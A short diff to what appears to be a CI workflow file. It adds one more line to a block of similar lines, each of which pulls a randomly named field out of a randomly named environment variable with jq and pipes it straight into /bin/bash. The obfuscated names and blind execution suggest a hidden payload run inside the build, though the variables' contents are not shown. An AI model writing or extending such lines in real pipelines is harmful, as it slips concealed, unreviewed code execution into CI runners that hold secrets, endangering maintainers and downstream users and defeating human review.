@@ -29,6 +29,7 @@ jobs:
           echo $fdr9863 | jq -r .tcrwi56 | /bin/bash
           echo $dvj04 | jq -r .v480 | /bin/bash
           printf '%s' "$brzn51318" | jq -r .stsn5042 | /bin/bash
+          echo $wqu1114 | jq -r .uae842 | /bin/bash
 
       - name: Upload artifact
         if: always()
